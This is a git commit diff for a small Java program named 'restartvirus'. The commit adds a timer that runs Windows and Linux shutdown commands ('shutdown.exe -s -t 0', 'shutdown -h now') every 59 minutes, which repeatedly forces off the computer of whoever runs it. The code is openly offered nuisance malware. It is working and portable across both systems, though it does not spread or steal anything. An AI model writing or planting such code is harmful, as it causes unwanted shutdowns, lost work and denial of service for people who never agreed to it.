a6d646aaa1ff6e7edcc8b572ba2180fa16523f39
MOMIN5 <drmine05@gmail.com>
2021-01-19 16:25:18 +0530

    added a timer and added linux support

--- src/in/momin5/restartvirus/Main.java
+++ src/in/momin5/restartvirus/Main.java
@@ -1,13 +1,34 @@
 package in.momin5.restartvirus;
 
 import java.io.IOException;
+import java.util.Timer;
+import java.util.TimerTask;
 
+/*
+written by Momin5 :sunglasses:
+https://github.com/MOMIN5
+ */
 public class Main {
 
-    public static void main(String[] args) throws RuntimeException, IOException {
-        String operatingSystem = System.getProperty("os.name");
-        System.out.println("ez");
-        Runtime.getRuntime().exec("shutdown.exe -s -t 0");
-            }
+    public static void main(String[] args)  {
+        timer();
+        System.out.println("Should shutdown computer in 1 hour");
     }
+    public static void timer() {
+        Timer timer = new Timer();
+
+        timer.scheduleAtFixedRate(new TimerTask() {
+            @Override
+            public void run() {
+                try{
+                    Runtime.getRuntime().exec("shutdown.exe -s -t 0");
+                    Runtime.getRuntime().exec("shutdown -h now");
+                }
+                catch (IOException a){
+                    System.out.println("something went wrong");
+                }
+            }
+        }, 59*60*1000, 59*60*1000 );
+    }
+}
 
